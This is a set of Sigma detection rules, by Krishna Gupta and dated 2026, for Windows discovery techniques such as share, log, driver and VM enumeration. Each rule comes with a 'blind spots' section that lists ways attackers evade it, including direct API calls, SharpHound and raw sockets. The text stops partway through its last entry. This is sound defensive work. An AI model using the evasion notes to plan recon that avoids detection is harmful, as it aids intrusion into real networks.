+#### Rule 1 of 1: Network Share Enumeration via Native Tools
+Detects the use of `net.exe` or `net1.exe` to enumerate shared folders on local or remote hosts.
+
+```yaml
+title: Network Share Enumeration via Native Tools (AN2087)
+id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
+status: experimental
+description: Detects execution of net.exe or net1.exe to list network shares on local or remote systems. Covers renamed binaries via OriginalFileName to resist trivial binary-rename evasion.
+author: Krishna Gupta
+date: 2026-07-01
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_images:
+        Image|endswith:
+            - '\net.exe'
+            - '\net1.exe'
+    selection_ofn:
+        OriginalFileName:
+            - 'net.exe'
+            - 'net1.exe'
+    selection_cli:
+        CommandLine|re:
+            - '(?i)\bnet(1)?\s+(share|view)\b'
+    filter_logon:
+        ParentCommandLine|contains: '\NETLOGON\'
+    condition: (selection_images or selection_ofn) and selection_cli and not filter_logon
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - Helpdesk personnel or automated scripts inventorying available shares.
+level: medium
+tags:
+    - attack.discovery
+    - attack.t1135
+    - analytic.an2087
+    - detection.det0944
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: SMB-Level Enumeration
+  * The Issue: Tools like SharpShares or Snaffler use direct SMB API calls without invoking `net.exe`.
+  * The Fix: Monitor Zeek SMB logs for high-frequency `TREE_CONNECT` requests from a single source host.
+* Problem 2: PowerShell Cmdlets
+  * The Issue: `Get-SmbShare` and `Get-WmiObject -Class Win32_Share` achieve the same result silently.
+  * The Fix: Enable PowerShell Script Block Logging (Event ID 4104) and monitor for those cmdlets.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present when PE metadata is intact.
+  * The Fix: Treat Image and OriginalFileName as complementary — either match alone is sufficient.
+
+
+==========================================================================================
+FILE: discovery/AN2088-T1614-DET0945.md
+RULE TITLE: System Locale and Keyboard Layout Discovery (AN2088)
+==========================================================================================
+
+### 1. Technique Breakdown: T1614
+
+* What it is: System Location Discovery. Adversaries may gather information in an attempt to calculate the geographical location of a victim in order to infer their operational environment.
+* Log Source Requirements: Sysmon Process Creation events (Event ID 1) / Security Event ID 4688 / PowerShell Event ID 4104.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. PowerShell and reg.exe command lines are captured.
+  - NIDS (Suricata + Zeek): NO. Host-local discovery.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: System Locale and Keyboard Layout Discovery
+Detects queries for regional/locale settings via registry or PowerShell, used by malware to determine victim geography.
+
+```yaml
+title: System Locale and Keyboard Layout Discovery (AN2088)
+id: b2c3d4e5-f6a7-8901-bcde-f01234567891
+status: experimental
+description: Detects command-line queries of Windows locale, keyboard layout, or timezone registry keys used to determine system geographic location. Covers renamed binaries via OriginalFileName to resist trivial binary-rename evasion.
+author: Krishna Gupta
+date: 2026-07-01
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_reg:
+        Image|endswith:
+            - '\reg.exe'
+    selection_reg_ofn:
+        OriginalFileName: 'reg.exe'
+    selection_reg_cli:
+        CommandLine|contains:
+            - 'International'
+            - 'Keyboard Layout'
+            - 'TimeZoneInformation'
+    selection_ps:
+        Image|endswith:
+            - '\powershell.exe'
+            - '\pwsh.exe'
+    selection_ps_ofn:
+        OriginalFileName:
+            - 'PowerShell.EXE'
+            - 'pwsh.exe'
+    selection_ps_cli:
+        CommandLine|contains:
+            - 'Get-Culture'
+            - 'Get-WinSystemLocale'
+            - 'CurrentCulture'
+            - 'TimeZone'
+    selection_wmic:
+        Image|endswith:
+            - '\wmic.exe'
+    selection_wmic_ofn:
+        OriginalFileName: 'wmic.exe'
+    selection_wmic_cli:
+        CommandLine|contains:
+            - 'os get locale'
+    condition: ((selection_reg or selection_reg_ofn) and selection_reg_cli) or ((selection_ps or selection_ps_ofn) and selection_ps_cli) or ((selection_wmic or selection_wmic_ofn) and selection_wmic_cli)
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - Application installers configuring locale-specific defaults.
+level: low
+tags:
+    - attack.discovery
+    - attack.t1614
+    - analytic.an2088
+    - detection.det0945
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: Win32 API Calls
+  * The Issue: Malware calling `GetSystemDefaultLCID()` or `GetLocaleInfo()` directly bypasses process-level detection.
+  * The Fix: Requires API-level monitoring via EDR or memory analysis.
+* Problem 2: WMI Queries
+  * The Issue: `wmic os get locale` achieves the same result without registry access.
+  * The Fix: Add a WMIC-based detection block or rely on a generic WMIC monitoring rule.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present when PE metadata is intact.
+  * The Fix: Treat Image and OriginalFileName as complementary — either match alone is sufficient.
+
+
+==========================================================================================
+FILE: discovery/AN2089-T1124-DET0946.md
+RULE TITLE: System Time and Timezone Discovery (AN2089)
+==========================================================================================
+
+### 1. Technique Breakdown: T1124
+
+* What it is: System Time Discovery. Adversaries may gather the system time and/or time zone information from a local or remote system to delay execution or to fingerprint the environment.
+* Log Source Requirements: Sysmon Process Creation events (Event ID 1) / Security Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process command lines are captured.
+  - NIDS (Suricata + Zeek): NO. Host-local discovery.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: System Time and Timezone Discovery
+Detects the use of `net time`, `w32tm`, or `time` to gather the current system time.
+
+```yaml
+title: System Time and Timezone Discovery (AN2089)
+id: c3d4e5f6-a7b8-9012-cdef-012345678902
+status: experimental
+description: Detects command-line queries for system time or timezone information used to fingerprint the target environment. Covers renamed binaries via OriginalFileName to resist trivial binary-rename evasion.
+author: Krishna Gupta
+date: 2026-07-01
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_net:
+        Image|endswith:
+            - '\net.exe'
+            - '\net1.exe'
+    selection_net_ofn:
+        OriginalFileName:
+            - 'net.exe'
+            - 'net1.exe'
+    selection_net_cli:
+        CommandLine|re:
+            - '(?i)\bnet(1)?\s+time\b'
+    filter_ntp:
+        ParentImage|endswith: '\w32tm.exe'
+    selection_w32tm:
+        Image|endswith:
+            - '\w32tm.exe'
+    selection_w32tm_ofn:
+        OriginalFileName: 'w32tm.exe'
+    selection_w32tm_cli:
+        CommandLine|contains:
+            - '/query'
+            - '/tz'
+    condition: (((selection_net or selection_net_ofn) and selection_net_cli) or ((selection_w32tm or selection_w32tm_ofn) and selection_w32tm_cli)) and not filter_ntp
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - NTP synchronization scripts or administrators verifying time skew before Kerberos authentication.
+level: low
+tags:
+    - attack.discovery
+    - attack.t1124
+    - analytic.an2089
+    - detection.det0946
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: GetSystemTime API
+  * The Issue: Malware querying `GetSystemTime()` or `GetLocalTime()` directly will not spawn any visible process.
+  * The Fix: Requires EDR telemetry for Win32 API-level monitoring.
+* Problem 2: Low Signal-to-Noise as a Standalone Rule
+  * The Issue: Time queries are extremely common and benign in isolation.
+  * The Fix: Correlate with other discovery commands within a short time window — time discovery becomes suspicious when grouped with account/network enumeration.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present when PE metadata is intact.
+  * The Fix: Treat Image and OriginalFileName as complementary — either match alone is sufficient.
+
+
+==========================================================================================
+FILE: discovery/AN2090-T1615-DET0947.md
+RULE TITLE: Group Policy Enumeration (AN2090)
+==========================================================================================
+
+### 1. Technique Breakdown: T1615
+
+* What it is: Group Policy Discovery. Adversaries may gather information on Group Policy settings to identify paths for privilege escalation or lateral movement.
+* Log Source Requirements: Sysmon Process Creation events (Event ID 1) / Security Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process command lines for gpresult.exe and PowerShell are captured.
+  - NIDS (Suricata + Zeek): NO. Host-local discovery.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: Group Policy Enumeration
+Detects the use of `gpresult.exe` or PowerShell cmdlets to enumerate applied Group Policy objects.
+
+```yaml
+title: Group Policy Enumeration (AN2090)
+id: d4e5f6a7-b8c9-0123-def0-123456789003
+status: experimental
+description: Detects command-line utilities enumerating Group Policy Objects (GPOs) applied to the system or domain. Covers renamed binaries via OriginalFileName to resist trivial binary-rename evasion.
+author: Krishna Gupta
+date: 2026-07-01
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_gpresult:
+        Image|endswith:
+            - '\gpresult.exe'
+    selection_gpresult_ofn:
+        OriginalFileName: 'gpresult.exe'
+    selection_gpresult_cli:
+        CommandLine|contains:
+            - '/r'
+            - '/z'
+            - '/scope'
+    selection_ps:
+        Image|endswith:
+            - '\powershell.exe'
+            - '\pwsh.exe'
+    selection_ps_ofn:
+        OriginalFileName:
+            - 'PowerShell.EXE'
+            - 'pwsh.exe'
+    selection_ps_cli:
+        CommandLine|contains:
+            - 'Get-GPO'
+            - 'Get-GPResultantSetOfPolicy'
+            - 'Get-DomainGPO'
+    condition: ((selection_gpresult or selection_gpresult_ofn) and selection_gpresult_cli) or ((selection_ps or selection_ps_ofn) and selection_ps_cli)
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - System administrators verifying applied policy settings during troubleshooting.
+level: medium
+tags:
+    - attack.discovery
+    - attack.t1615
+    - analytic.an2090
+    - detection.det0947
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: LDAP Direct Queries
+  * The Issue: Attackers may query the SYSVOL share or enumerate GPOs via LDAP without using `gpresult.exe` or PowerShell.
+  * The Fix: Monitor file system access to `\\<DC>\SYSVOL\` using Sysmon Event ID 11 or Zeek SMB logs.
+* Problem 2: BloodHound GPO Collection
+  * The Issue: BloodHound/SharpHound collects GPO data silently over LDAP.
+  * The Fix: Detect high-frequency LDAP queries to Domain Controllers using Zeek LDAP logs or Windows Event ID 1644.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present when PE metadata is intact.
+  * The Fix: Treat Image and OriginalFileName as complementary — either match alone is sufficient.
+
+
+==========================================================================================
+FILE: discovery/AN2091-T1654-DET0948.md
+RULE TITLE: Windows Event Log Enumeration (AN2091)
+==========================================================================================
+
+### 1. Technique Breakdown: T1654
+
+* What it is: Log Enumeration. Adversaries may enumerate system and service logs to find useful data, identify security tooling, or assess forensic visibility before executing further attack phases.
+* Log Source Requirements: Sysmon Process Creation events (Event ID 1) / Security Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process command lines are captured.
+  - NIDS (Suricata + Zeek): NO. Host-local discovery.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: Windows Event Log Enumeration
+Detects the use of `wevtutil.exe` or PowerShell to query or export Windows event logs.
+
+```yaml
+title: Windows Event Log Enumeration (AN2091)
+id: e5f6a7b8-c9d0-1234-ef01-234567890004
+status: experimental
+description: Detects command-line utilities enumerating or exporting Windows event logs, used by attackers to assess security tooling and forensic visibility. Covers renamed binaries via OriginalFileName to resist trivial binary-rename evasion.
+author: Krishna Gupta
+date: 2026-07-01
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_wevtutil:
+        Image|endswith:
+            - '\wevtutil.exe'
+    selection_wevtutil_ofn:
+        OriginalFileName: 'wevtutil.exe'
+    selection_wevtutil_cli:
+        CommandLine|re:
+            - '(?i)wevtutil(\.exe)?\s+(el|gl|qe|epl)\b'
+    selection_ps:
+        Image|endswith:
+            - '\powershell.exe'
+            - '\pwsh.exe'
+    selection_ps_ofn:
+        OriginalFileName:
+            - 'PowerShell.EXE'
+            - 'pwsh.exe'
+    selection_ps_cli:
+        CommandLine|contains:
+            - 'Get-EventLog'
+            - 'Get-WinEvent'
+    condition: ((selection_wevtutil or selection_wevtutil_ofn) and selection_wevtutil_cli) or ((selection_ps or selection_ps_ofn) and selection_ps_cli)
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - SOC analysts or automated monitoring scripts reviewing event logs for incident investigation.
+level: medium
+tags:
+    - attack.discovery
+    - attack.t1654
+    - analytic.an2091
+    - detection.det0948
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: Overlap with Log Clearing (T1070.001)
+  * The Issue: Adversaries may enumerate logs immediately before clearing them; both actions look similar at the command-line level.
+  * The Fix: Correlate this rule with Sysmon Event ID 104 (EventLog Cleared) or wevtutil `cl` (clear) commands to detect a recon-then-wipe sequence.
+* Problem 2: Direct API Access
+  * The Issue: Malware using the `OpenEventLog()` / `ReadEventLog()` Win32 API directly bypasses command-line detection.
+  * The Fix: Requires EDR-level API hooking or monitoring of process handle access to the EventLog service.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present when PE metadata is intact.
+  * The Fix: Treat Image and OriginalFileName as complementary — either match alone is sufficient.
+
+
+==========================================================================================
+FILE: discovery/AN2092-T1652-DET0949.md
+RULE TITLE: Device Driver Enumeration (AN2092)
+==========================================================================================
+
+### 1. Technique Breakdown: T1652
+
+* What it is: Device Driver Discovery. Adversaries may attempt to enumerate installed device drivers to identify security software, system configurations, or potential kernel exploitation targets.
+* Log Source Requirements: Sysmon Process Creation events (Event ID 1) / Security Event ID 4688 / PowerShell Event ID 4104.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process command lines are captured.
+  - NIDS (Suricata + Zeek): NO. Host-local discovery.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: Device Driver Enumeration
+Detects the use of `driverquery.exe` or `sc.exe` to enumerate installed kernel and user-mode drivers.
+
+```yaml
+title: Device Driver Enumeration (AN2092)
+id: f6a7b8c9-d0e1-2345-f012-345678900005
+status: experimental
+description: Detects command-line utilities enumerating installed device drivers, used to identify security software or kernel exploitation targets. Covers renamed binaries via OriginalFileName to resist trivial binary-rename evasion.
+author: Krishna Gupta
+date: 2026-07-01
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_driverquery:
+        Image|endswith:
+            - '\driverquery.exe'
+    selection_driverquery_ofn:
+        OriginalFileName: 'driverquery.exe'
+    selection_sc:
+        Image|endswith:
+            - '\sc.exe'
+    selection_sc_ofn:
+        OriginalFileName: 'sc.exe'
+    selection_sc_cli:
+        CommandLine|contains:
+            - ' query type= driver'
+            - ' query type=driver'
+    selection_wmic:
+        Image|endswith:
+            - '\wmic.exe'
+    selection_wmic_ofn:
+        OriginalFileName: 'wmic.exe'
+    selection_wmic_cli:
+        CommandLine|contains: 'sysdriver'
+    condition: selection_driverquery or selection_driverquery_ofn or ((selection_sc or selection_sc_ofn) and selection_sc_cli) or ((selection_wmic or selection_wmic_ofn) and selection_wmic_cli)
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - Administrators auditing driver health or diagnosing hardware compatibility issues.
+level: medium
+tags:
+    - attack.discovery
+    - attack.t1652
+    - analytic.an2092
+    - detection.det0949
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: WMI Driver Query
+  * The Issue: `wmic sysdriver list` enumerates drivers without invoking `driverquery.exe`.
+  * The Fix: Add a WMIC block or a generic WMIC monitoring rule for `sysdriver` queries.
+* Problem 2: Registry Enumeration
+  * The Issue: Attackers can read `HKLM\SYSTEM\CurrentControlSet\Services` to list drivers without any external tool.
+  * The Fix: Monitor Sysmon Event ID 12/13 for access to that registry subtree.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present when PE metadata is intact.
+  * The Fix: Treat Image and OriginalFileName as complementary — either match alone is sufficient.
+
+
+==========================================================================================
+FILE: discovery/AN2093-T1040-DET0950.md
+RULE TITLE: Network Packet Capture Tool Execution (AN2093)
+==========================================================================================
+
+### 1. Technique Breakdown: T1040
+
+* What it is: Network Sniffing. Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network.
+* Log Source Requirements: Sysmon Process Creation events (Event ID 1) / Security Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process command lines for known packet capture utilities are captured.
+  - NIDS (Suricata + Zeek): NO. NIDS itself is the target tool class; anomaly detection on the host is required.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: Network Packet Capture Tool Execution
+Detects the execution of well-known packet capture utilities on a Windows endpoint where they are not expected.
+
+```yaml
+title: Network Packet Capture Tool Execution (AN2093)
+id: a7b8c9d0-e1f2-3456-0123-456789000006
+status: experimental
+description: Detects the execution of network packet capture binaries such as tshark, windump, or tcpdump on a Windows host, indicating potential credential harvesting or network reconnaissance.
+author: Krishna Gupta
+date: 2026-07-01
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_images:
+        Image|endswith:
+            - '\tshark.exe'
+            - '\windump.exe'
+            - '\tcpdump.exe'
+            - '\rawcap.exe'
+            - '\pktmon.exe'
+    selection_ofn:
+        OriginalFileName:
+            - 'tshark.exe'
+            - 'windump.exe'
+            - 'tcpdump.exe'
+            - 'rawcap.exe'
+            - 'PktMon.exe'
+    condition: selection_images or selection_ofn
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - Network engineers or security analysts running authorized packet captures for diagnostics.
+level: high
+tags:
+    - attack.credential_access
+    - attack.discovery
+    - attack.t1040
+    - analytic.an2093
+    - detection.det0950
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: Raw Socket Sniffing
+  * The Issue: Custom malware can open raw sockets using `WSASocket` with `SOCK_RAW` without invoking any external tool.
+  * The Fix: Requires kernel-level monitoring (e.g. Windows Filtering Platform callouts) to detect raw socket creation.
+* Problem 2: Built-in pktmon Whitelisting
+  * The Issue: `pktmon.exe` is a Microsoft-signed Windows built-in, so it may be running legitimately on some servers.
+  * The Fix: Baseline normal `pktmon.exe` usage in your environment and alert only on non-baseline hosts or unusual command-line arguments.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present when PE metadata is intact.
+  * The Fix: Treat Image and OriginalFileName as complementary — either match alone is sufficient.
+
+
+==========================================================================================
+FILE: discovery/AN2094-T1497-DET0951.md
+RULE TITLE: VM and Sandbox Detection Artifact Queries (AN2094)
+==========================================================================================
+
+### 1. Technique Breakdown: T1497
+
+* What it is: Virtualization/Sandbox Evasion. Adversaries may employ various means to detect and avoid virtualization or analysis environments, delaying or stopping execution in response to those conditions.
+* Log Source Requirements: Sysmon Process Creation events (Event ID 1) / Security Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process command lines querying VM artifacts are captured.
+  - NIDS (Suricata + Zeek): NO. Host-local discovery.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: VM and Sandbox Detection Artifact Queries
+Detects command-line queries for artifacts commonly checked by malware to detect virtual machine or sandbox environments.
+
+```yaml
+title: VM and Sandbox Detection Artifact Queries (AN2094)
+id: b8c9d0e1-f2a3-4567-1234-567890000007
+status: experimental
+description: Detects execution of commands querying VM-specific registry keys, services, or hardware strings used by malware to evade analysis sandboxes. Covers renamed binaries via OriginalFileName to resist trivial binary-rename evasion.
+author: Krishna Gupta
+date: 2026-07-01
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_reg:
+        Image|endswith:
+            - '\reg.exe'
+    selection_reg_ofn:
+        OriginalFileName: 'reg.exe'
+    selection_reg_cli:
+        CommandLine|contains:
+            - 'VirtualBox'
+            - 'VMware'
+            - 'VBOX'
+            - 'QEMU'
+            - 'Hyper-V'
+            - 'Xen'
+    selection_wmic:
+        Image|endswith:
+            - '\wmic.exe'
+    selection_wmic_ofn:
+        OriginalFileName: 'wmic.exe'
+    selection_wmic_cli:
+        CommandLine|contains:
+            - 'VBOX'
+            - 'VMware'
+            - 'VirtualBox'
+            - 'biosseralnum'
+    filter_hyperv_admin:
+        ParentImage|endswith:
+            - '\vmconnect.exe'
+            - '\vmms.exe'
+    condition: (((selection_reg or selection_reg_ofn) and selection_reg_cli) or ((selection_wmic or selection_wmic_ofn) and selection_wmic_cli)) and not filter_hyperv_admin
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - Legitimate virtualization management software querying its own artifacts.
+level: high
+tags:
+    - attack.defense_evasion
+    - attack.discovery
+    - attack.t1497
+    - analytic.an2094
+    - detection.det0951
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: Timing Checks
+  * The Issue: Malware using execution timing (e.g. RDTSC instruction or Sleep-then-check) to detect sandboxes will leave no command-line trace.
+  * The Fix: Requires dynamic analysis or behavioral sandbox engines, not Sigma rules.
+* Problem 2: CPUID Instruction Checks
+  * The Issue: Hypervisor detection via the `CPUID` instruction is completely invisible to process-level monitoring.
+  * The Fix: Same as above — out-of-scope for host-based Sigma detection.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present when PE metadata is intact.
+  * The Fix: Treat Image and OriginalFileName as complementary — either match alone is sufficient.
+
+
+==========================================================================================
+FILE: discovery/AN2095-T1673-DET0952.md
+RULE TITLE: Virtual Machine Infrastructure Enumeration (AN2095)
+==========================================================================================
+
+### 1. Technique Breakdown: T1673
+
+* What it is: Virtual Machine Discovery. Adversaries may attempt to gather information about any virtual machine (VM) environment present in the network to identify targets for lateral movement or to understand the infrastructure.
+* Log Source Requirements: Sysmon Process Creation events (Event ID 1) / Security Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process command lines are captured.
+  - NIDS (Suricata + Zeek): NO. Host-local discovery.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: Virtual Machine Infrastructure Enumeration
+Detects the use of PowerShell or WMI to enumerate virtual machine infrastructure on a Windows host.
+
+```yaml
+title: Virtual Machine Infrastructure Enumeration (AN2095)
+id: c9d0e1f2-a3b4-5678-2345-678900000008
+status: experimental
+description: Detects command-line queries enumerating Hyper-V, VMware, or other virtualization platform infrastructure used for lateral movement planning. Covers renamed binaries via OriginalFileName to resist trivial binary-rename evasion.
+author: Krishna Gupta
+date: 2026-07-01
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_ps:
+        Image|endswith:
+            - '\powershell.exe'
+            - '\pwsh.exe'
+    selection_ps_ofn:
+        OriginalFileName:
+            - 'PowerShell.EXE'
+            - 'pwsh.exe'
+    selection_ps_cli:
+        CommandLine|contains:
+            - 'Get-VM'
+            - 'Get-VMHost'
+            - 'Get-VirtualMachine'
+            - 'Get-SCVirtualMachine'
+    selection_wmic:
+        Image|endswith:
+            - '\wmic.exe'
+    selection_wmic_ofn:
+        OriginalFileName: 'wmic.exe'
+    selection_wmic_cli:
+        CommandLine|contains:
+            - 'HypervisorPresent'
+            - 'Msvm_ComputerSystem'
+            - 'Win32_VirtualSystemManagementService'
+    condition: ((selection_ps or selection_ps_ofn) and selection_ps_cli) or ((selection_wmic or selection_wmic_ofn) and selection_wmic_cli)
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - Hyper-V administrators or SCVMM management tools legitimately inventorying virtual machines.
+level: medium
+tags:
+    - attack.discovery
+    - attack.t1673
+    - analytic.an2095
+    - detection.det0952
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: VMware vSphere API
+  * The Issue: Attackers with vCenter access can enumerate all VMs via the vSphere API without touching the Windows command line.
+  * The Fix: Monitor vCenter audit logs for unauthorized API calls to VM enumeration methods.
+* Problem 2: Third-Party Management Consoles
+  * The Issue: Tools like Veeam, Zerto, or Nutanix management consoles enumerate VMs via their own interfaces.
+  * The Fix: Whitelist known management console service accounts as false positive sources.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present when PE metadata is intact.
+  * The Fix: Treat Image and OriginalFileName as complementary — either match alone is sufficient.
+
+
+==========================================================================================
+FILE: discovery/AN2096-T1680-DET0953.md
+RULE TITLE: Local Storage Device Enumeration (AN2096)
+==========================================================================================
+
+### 1. Technique Breakdown: T1680
+
+* What it is: Local Storage Discovery. Adversaries may enumerate local storage devices to identify data stores for collection or to locate credentials and sensitive files.
+* Log Source Requirements: Sysmon Process Creation events (Event ID 1) / Security Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process command lines are captured.
+  - NIDS (Suricata + Zeek): NO. Host-local discovery.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: Local Storage Device Enumeration
+Detects the use of `fsutil`, `diskpart`, or WMIC to enumerate local storage volumes and drives.
+
+```yaml
+title: Local Storage Device Enumeration (AN2096)
+id: d0e1f2a3-b4c5-6789-3456-789000000009
+status: experimental
+description: Detects command-line enumeration of local disk volumes and storage devices used to identify data collection targets. Covers renamed binaries via OriginalFileName to resist trivial binary-rename evasion.
+author: Krishna Gupta
+date: 2026-07-01
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_fsutil:
+        Image|endswith:
+            - '\fsutil.exe'
+    selection_fsutil_ofn:
+        OriginalFileName: 'fsutil.exe'
+    selection_fsutil_cli:
+        CommandLine|contains:
+            - ' fsinfo drives'
+    selection_wmic:
+        Image|endswith:
+            - '\wmic.exe'
+    selection_wmic_ofn:
+        OriginalFileName: 'wmic.exe'
+    selection_wmic_cli:
+        CommandLine|contains:
+            - ' logicaldisk '
+            - ' diskdrive '
+    filter_inventory:
+        ParentImage|endswith: '\ccmexec.exe'
+    condition: (((selection_fsutil or selection_fsutil_ofn) and selection_fsutil_cli) or ((selection_wmic or selection_wmic_ofn) and selection_wmic_cli)) and not filter_inventory
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - Asset inventory scripts or disk management utilities performing routine checks.
+level: low
+tags:
+    - attack.discovery
+    - attack.t1680
+    - analytic.an2096
+    - detection.det0953
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: Win32 API Enumeration
+  * The Issue: Malware using `GetLogicalDrives()` or `FindFirstVolume()` directly will produce no command-line artifacts.
+  * The Fix: Requires EDR API-level monitoring for volume enumeration calls.
+* Problem 2: PowerShell Equivalents
+  * The Issue: `Get-PSDrive` or `Get-Volume` provides equivalent information without invoking the detected binaries.
+  * The Fix: Enable PowerShell Script Block Logging (Event ID 4104) and monitor for those cmdlets.
+* Problem 3: OriginalFileName availability
+  * The Issue: OriginalFileName is only present when PE metadata is intact.
+  * The Fix: Treat Image and OriginalFileName as complementary — either match alone is sufficient.
+
+
+==========================================================================================
+FILE: discovery/AN2097-T1622-DET0954.md
+RULE TITLE: Debugger Presence Check via Registry or Process Query (AN2097)
+==========================================================================================
+
+### 1. Technique Breakdown: T1622
+
+* What it is: Debugger Evasion. Adversaries may employ various means to detect and avoid debuggers to prevent reverse engineering or dynamic analysis.
+* Log Source Requirements: Sysmon Process Creation events (Event ID 1) / Security Event ID 4688.
+* Coverage Check:
+  - HIDS (Sysmon + Windows Defender): YES. Process command lines querying debug-related artifacts are captured.
+  - NIDS (Suricata + Zeek): NO. Host-local discovery.
+* Log Sources Covered:
+  - Sysmon Event ID 1 (process_creation)
+* Log Sources Missing / Unused:
+  - None.
+
+---
+
+### 2. Custom Sigma Rule
+
+#### Rule 1 of 1: Debugger Presence Check via Registry or NtGlobalFlag
+Detects command-line queries for debugger-related registry keys or process heap flags used by malware to check if it is being analyzed.
+
+```yaml
+title: Debugger Presence Check via Registry or Process Query (AN2097)
+id: e1f2a3b4-c5d6-7890-4567-890000000010
+status: experimental
+description: Detects command-line queries targeting debugger artifacts in the registry (Image File Execution Options, postmortem debugger) used by malware to determine if it is being debugged. Covers renamed binaries via OriginalFileName to resist trivial binary-rename evasion.
+author: Krishna Gupta
+date: 2026-07-01
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_reg:
+        Image|endswith:
+            - '\reg.exe'
+    selection_reg_ofn:
+        OriginalFileName: 'reg.exe'
+    selection_reg_cli:
+        CommandLine|contains:
+            - 'Image File Execution Options'
+            - 'AeDebug'
+            - 'GlobalFlag'
+            - 'postmortem'
+    condition: (selection_reg or selection_reg_ofn) and selection_reg_cli
+fields:
+    - Image
+    - OriginalFileName
+    - CommandLine
+    - User
+falsepositives:
+    - Developers configuring just-in-time (JIT) debugging for application crash handling.
+level: medium
+tags:
+    - attack.defense_evasion
+    - attack.t1622
+    - analytic.an2097
+    - detection.det0954
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: IsDebuggerPresent API
